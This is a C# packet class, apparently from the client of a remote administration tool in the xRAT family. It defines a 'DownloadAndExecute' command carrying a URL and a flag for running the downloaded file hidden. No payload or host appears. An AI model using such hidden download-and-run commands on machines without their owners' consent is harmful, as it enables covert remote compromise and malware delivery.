using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DownloadAndExecute : IPacket
    {
        public DownloadAndExecute()
        {
        }

        public DownloadAndExecute(string url, bool runhidden)
        {
            URL = url;
            RunHidden = runhidden;
        }

        [ProtoMember(1)]
        public string URL { get; set; }

        [ProtoMember(2)]
        public bool RunHidden { get; set; }

        public void Execute(Client client)
        {
            client.Send<DownloadAndExecute>(this);
        }
    }
}